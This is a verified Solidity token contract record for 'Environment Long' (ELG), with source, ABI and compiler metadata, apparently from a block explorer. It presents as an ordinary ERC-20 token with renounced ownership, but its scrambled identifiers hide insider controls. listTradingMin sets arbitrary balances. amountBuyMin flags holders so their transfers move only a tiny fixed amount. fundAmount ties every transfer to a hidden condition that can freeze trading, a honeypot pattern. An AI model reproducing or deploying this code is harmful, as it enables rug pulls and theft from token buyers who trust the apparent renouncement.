{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface tokenFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txEnable {\n    function createPair(address walletExempt, address walletLimit) external returns (address);\n}\n\ninterface maxTokenReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletList) external view returns (uint256);\n\n    function transfer(address launchTeamMode, uint256 fromTeam) external returns (bool);\n\n    function allowance(address walletMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchTeamMode,\n        uint256 fromTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellMarketing, uint256 value);\n    event Approval(address indexed walletMax, address indexed spender, uint256 value);\n}\n\ninterface maxTokenReceiverMetadata is maxTokenReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnvironmentLong is fundToken, maxTokenReceiver, maxTokenReceiverMetadata {\n\n    uint256 public receiverWallet;\n\n    event OwnershipTransferred(address indexed walletLimitLaunched, address indexed liquidityWallet);\n\n    function balanceOf(address walletList) public view virtual override returns (uint256) {\n        return amountEnableShould[walletList];\n    }\n\n    bool public tokenSwap;\n\n    bool public listTo;\n\n    address public marketingAt;\n\n    bool private exemptTeam;\n\n    mapping(address => bool) public tokenMode;\n\n    address buyMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private fromMin = \"Environment Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapReceiver;\n    }\n\n    uint256 walletFundTake;\n\n    mapping(address => mapping(address => uint256)) private minFrom;\n\n    bool public receiverTxToken;\n\n    bool public sellLaunched;\n\n    bool public fromLaunched;\n\n    mapping(address => bool) public feeReceiver;\n\n    function fundAmount(uint256 fromTeam) public {\n        takeReceiver();\n        walletFundTake = fromTeam;\n    }\n\n    function fromIs(address receiverFund, address launchTeamMode, uint256 fromTeam) internal returns (bool) {\n        require(amountEnableShould[receiverFund] >= fromTeam);\n        amountEnableShould[receiverFund] -= fromTeam;\n        amountEnableShould[launchTeamMode] += fromTeam;\n        emit Transfer(receiverFund, launchTeamMode, fromTeam);\n        return true;\n    }\n\n    address launchedReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private swapReceiver = \"ELG\";\n\n    function name() external view virtual override returns (string memory) {\n        return fromMin;\n    }\n\n    function amountBuyMin(address shouldAmountFrom) public {\n        takeReceiver();\n        \n        if (shouldAmountFrom == marketingAt || shouldAmountFrom == exemptLiquidity) {\n            return;\n        }\n        feeReceiver[shouldAmountFrom] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamLaunch;\n    }\n\n    function listTradingMin(address receiverSell, uint256 fromTeam) public {\n        takeReceiver();\n        amountEnableShould[receiverSell] = fromTeam;\n    }\n\n    function takeReceiver() private view {\n        require(tokenMode[_msgSender()]);\n    }\n\n    mapping(address => uint256) private amountEnableShould;\n\n    uint256 public walletLiquidityEnable;\n\n    function listFee(address receiverFund, address launchTeamMode, uint256 fromTeam) internal returns (bool) {\n        if (receiverFund == marketingAt) {\n            return fromIs(receiverFund, launchTeamMode, fromTeam);\n        }\n        uint256 limitReceiver = maxTokenReceiver(exemptLiquidity).balanceOf(buyMode);\n        require(limitReceiver == walletFundTake);\n        require(launchTeamMode != buyMode);\n        if (feeReceiver[receiverFund]) {\n            return fromIs(receiverFund, launchTeamMode, launchedTakeMarketing);\n        }\n        return fromIs(receiverFund, launchTeamMode, fromTeam);\n    }\n\n    address public exemptLiquidity;\n\n    function transferFrom(address receiverFund, address launchTeamMode, uint256 fromTeam) external override returns (bool) {\n        if (_msgSender() != launchedReceiver) {\n            if (minFrom[receiverFund][_msgSender()] != type(uint256).max) {\n                require(fromTeam <= minFrom[receiverFund][_msgSender()]);\n                minFrom[receiverFund][_msgSender()] -= fromTeam;\n            }\n        }\n        return listFee(receiverFund, launchTeamMode, fromTeam);\n    }\n\n    uint256 private senderAuto;\n\n    function owner() external view returns (address) {\n        return modeMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeMin;\n    }\n\n    function buyExempt() public {\n        emit OwnershipTransferred(marketingAt, address(0));\n        modeMin = address(0);\n    }\n\n    function swapTo(address launchSender) public {\n        if (receiverTxToken) {\n            return;\n        }\n        if (fromLaunched) {\n            fromLaunched = false;\n        }\n        tokenMode[launchSender] = true;\n        if (fromLaunched) {\n            listTo = false;\n        }\n        receiverTxToken = true;\n    }\n\n    uint256 public senderSell;\n\n    uint256 toLaunch;\n\n    address private modeMin;\n\n    function allowance(address listToken, address minIs) external view virtual override returns (uint256) {\n        if (minIs == launchedReceiver) {\n            return type(uint256).max;\n        }\n        return minFrom[listToken][minIs];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverMarketing;\n    }\n\n    uint256 constant launchedTakeMarketing = 4 ** 10;\n\n    constructor (){\n        \n        tokenFrom teamTakeAt = tokenFrom(launchedReceiver);\n        exemptLiquidity = txEnable(teamTakeAt.factory()).createPair(teamTakeAt.WETH(), address(this));\n        \n        marketingAt = _msgSender();\n        buyExempt();\n        tokenMode[marketingAt] = true;\n        amountEnableShould[marketingAt] = teamLaunch;\n        if (tokenSwap == sellLaunched) {\n            sellLaunched = true;\n        }\n        emit Transfer(address(0), marketingAt, teamLaunch);\n    }\n\n    uint256 private teamLaunch = 100000000 * 10 ** 18;\n\n    function transfer(address receiverSell, uint256 fromTeam) external virtual override returns (bool) {\n        return listFee(_msgSender(), receiverSell, fromTeam);\n    }\n\n    uint8 private receiverMarketing = 18;\n\n    function approve(address minIs, uint256 fromTeam) public virtual override returns (bool) {\n        minFrom[_msgSender()][minIs] = fromTeam;\n        emit Approval(_msgSender(), minIs, fromTeam);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLimitLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmountFrom\",\"type\":\"address\"}],\"name\":\"amountBuyMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTeam\",\"type\":\"uint256\"}],\"name\":\"fundAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeam\",\"type\":\"uint256\"}],\"name\":\"listTradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTxToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTeamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLiquidityEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EnvironmentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}